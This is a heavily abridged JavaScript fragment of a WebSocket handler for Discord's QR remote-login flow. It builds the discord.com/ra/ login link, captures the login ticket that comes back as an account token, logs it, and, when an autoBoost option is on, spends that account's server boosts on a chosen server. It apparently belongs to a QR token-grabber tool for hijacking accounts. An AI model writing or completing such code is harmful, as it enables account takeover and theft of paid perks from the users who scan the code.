  ...
  socketClient.onmessage = async (event) => {
    ...
    switch (data.op) {
      ...
      case 'pending_remote_init':
        ...
        const fingerprintData = `https://discord.com/ra/${data.fingerprint}`;
      ...
      case 'pending_login':
        ...
        const token = data.ticket.toString();
        logSuccess(`${token}`);
        ...
        if (config.autoBoost) {
          ...
          if (allBoosts) await addBoostToserver(token, allBoosts.map(x => x.id));
        }
